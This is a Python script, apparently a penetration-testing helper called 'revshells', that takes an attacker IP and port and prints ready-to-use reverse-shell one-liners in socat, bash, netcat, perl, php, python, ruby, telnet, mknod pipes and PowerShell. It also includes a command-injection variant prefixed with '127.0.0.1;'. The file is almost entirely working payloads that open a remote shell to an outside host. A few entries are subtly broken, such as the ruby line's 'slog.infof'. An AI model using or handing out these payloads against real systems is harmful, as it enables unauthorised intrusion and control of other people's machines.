#!/usr/bin/python
#revshells is a tool to quickly print a collection of reverse shells usign diferent commands and languajes
#for quick access copy it to your path (/bin, /usr/bin, /usr/local/bin, etc)
#by dplastico (thanks to vay3t for teh heads up)
#Sagalid  re design the entire script and looks much better so im keeping it that way
#args added, and help menu

import sys
import socket
import optparse
try:
    from termcolor import colored
except ImportError as impErr:
    print(impErr)

def validate_port(portDst):
    try:
        portDst = int(portDst)
        if 1 <= portDst <= 65535:
            pass
        else:
            print("[!] Invalid Port")
            sys.exit(2)
    except Exception:
        print("[!] Invalid Port")
        sys.exit(2)

def validate_ip(ipDst):
    try:
    	socket.inet_aton(ipDst)
    except socket.error:
    	print("[!] Invalid IP")
        exit(2)        

def main():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--ip", dest="ipDst", help="LOCAL IP")
    parser.add_option("-p", "--port", dest="portDst", help="LOCAL PORT" )
    parser.add_option("-l", "--platform", dest="platform", help="Platform where revshell will run" )

    options, args = parser.parse_args()    
    if options:
        ipDst, portDst = False, False
        if options.ipDst:
            ipDst = options.ipDst
            validate_ip(ipDst)
        if options.portDst:
            portDst = options.portDst
            validate_port(portDst)
        if options.platform:
           platform = options.platform
        else:
            platform = ""
        if ipDst and portDst:
            print("["+colored("+","blue")+"] Init revshell generation on %s:%s" %(ipDst,portDst))
        else:
            print(parser.print_help())
            exit(2)

    # Shell dict
    shell_dict = {}
    shell_dict[('1', 'socat')] = "socat TCP4:%s:%s EXEC:bash,pty,stderr,setsid,sigint,sane" %(ipDst,portDst)
    shell_dict[('1', 'perl')] = "perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" %(ipDst,portDst)
    shell_dict[('1', 'php')] = "php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" %(ipDst,portDst)
    shell_dict[('2', 'php')] = '<?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f");?>' %(ipDst,portDst)
    shell_dict[('1', 'python')] = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" %(ipDst,portDst)
    shell_dict[('1', 'nc')] = "nc -e /bin/sh %s %s" %(ipDst,portDst)
    shell_dict[('1', 'bash')] = "bash -i >& /dev/tcp/%s/%s 0>&1" %(ipDst,portDst)
    shell_dict[('2', 'bash')] = "127.0.0.1;bash -i >& /dev/tcp/%s/%s 0>&1" %(ipDst,portDst)
    shell_dict[('1', 'telnet')] = "/bin /telnet %s 80 | /bin/bash | /bin/telnet %s 25" %(ipDst,portDst)
    shell_dict[('1', 'mknod')] = "mknod backpipe p && telnet %s %s 0<backpipe | /bin/bash 1>backpipe" %(ipDst,portDst)
    shell_dict[('2', 'mknod')] = "mknod /var/tmp/fgp p ; /bin/sh 0</var/tmp/fgp |nc %s %s 1>/var/tmp/fgp" %(ipDst,portDst)
    shell_dict[('3', 'mknod')] = 'mknod /var/tmp/fgp p ; /bin/sh 0</var/tmp/fgp |nc %s %s 1>/var/tmp/fgp' %(ipDst,portDst)
    shell_dict[('1', 'rm')] = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f " %(ipDst,portDst)
    shell_dict[('1', 'ruby')] = "ruby -rsocket -e'f=TCPSocket.open(\"%s\",%s).to_i;exec slog.infof(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)'" %(ipDst,portDst)
    shell_dict[('1', 'exec')] = "exec 5<>/dev/tcp/%s/%s; while read line 0<&5; do $line 2>&5 >&5; done" %(ipDst,portDst)
    shell_dict[('1', 'powershell')] = '$client = New-Object System.Net.Sockets.TCPClient(\"'+ipDst+'\",'+portDst+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%\{0\};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' #%(ipDst,portDst)
    shell_dict[('2', 'powershell')] = 'powershell.exe -c "$c = New-Object System.Net.Sockets.TCPClient(\"'+ipDst+'\",'+portDst+');$str = $c.GetStream();[byte[]]$b = 0..65535|%\{0\};while(($i = $str.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sendback = (iex $d 2>&1 | Out-String );$sendback2 = $sendback + "PS"  + (pwd).Path + "> ";$sb = ([text.encoding]::ASCII).GetBytes($sendback2);$str.Write($sb,0,$sb.Length);$str.Flush()};$c.Close()"' #%(ipDst,portDst)

    if platform == "":
        for key in shell_dict.keys():
            print("[" + colored("*","blue") + "] " + shell_dict[key])
    else:
        for key in shell_dict.keys():
            if platform in key:
                print("[" + colored("*","blue") + "] " + shell_dict[key])

if __name__ == "__main__":
    main()
